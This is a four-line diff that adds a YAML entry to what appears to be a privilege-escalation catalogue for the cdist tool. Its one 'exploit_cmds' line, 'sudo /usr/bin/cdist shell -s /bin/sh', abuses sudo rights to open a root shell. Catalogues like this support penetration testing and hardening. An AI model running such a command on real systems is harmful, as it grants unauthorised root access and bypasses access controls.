@@ -1,0 +1,4 @@
+name: cdist
+binary_path: /usr/bin/cdist
+exploit_cmds:
+- sudo /usr/bin/cdist shell -s /bin/sh
